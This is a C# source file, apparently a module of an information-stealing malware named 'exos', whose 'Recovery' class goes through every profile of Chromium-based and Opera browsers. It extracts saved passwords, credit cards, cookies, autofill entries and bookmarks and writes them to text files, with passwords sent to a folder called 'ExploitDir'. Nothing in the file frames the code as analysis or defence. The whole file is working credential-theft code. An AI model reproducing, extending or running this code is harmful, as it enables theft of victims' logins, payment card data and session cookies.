using System.Collections.Generic;
using System.IO;

namespace exos.Chromium;

internal sealed class Recovery
{
	public static void Run(string sSavePath)
	{
		if (!Directory.Exists(sSavePath))
		{
			Directory.CreateDirectory(sSavePath);
		}
		string[] sChromiumPswPaths = Paths.sChromiumPswPaths;
		foreach (string text in sChromiumPswPaths)
		{
			string path = ((!text.Contains("Opera Software")) ? (Paths.lappdata + text) : (Paths.appdata + text));
			if (Directory.Exists(path))
			{
				string[] directories = Directory.GetDirectories(path);
				foreach (string obj in directories)
				{
					string text2 = sSavePath + "\\" + Crypto.BrowserPathToAppName(text);
					Directory.CreateDirectory(text2);
					List<CreditCard> cCC = CreditCards.Get(obj + "\\Web Data");
					List<Password> pPasswords = Passwords.Get(obj + "\\Login Data");
					List<Cookie> cCookies = Cookies.Get(obj + "\\Cookies");
					List<AutoFill> aFills = Autofill.Get(obj + "\\Web Data");
					List<Bookmark> bBookmarks = Bookmarks.Get(obj + "\\Bookmarks");
					cBrowserUtils.WriteCreditCards(cCC, text2 + "\\CreditCards.txt");
					cBrowserUtils.WritePasswords(pPasswords, Helper.ExploitDir + "\\Passwords.txt");
					cBrowserUtils.WriteCookies(cCookies, sSavePath + $"\\Cookies_{Crypto.BrowserPathToAppName(text)}({GenStrings.GenNumbersTo()}).txt");
					cBrowserUtils.WriteAutoFill(aFills, text2 + "\\AutoFill.txt");
					cBrowserUtils.WriteBookmarks(bBookmarks, text2 + "\\Bookmarks.txt");
				}
			}
		}
	}
}
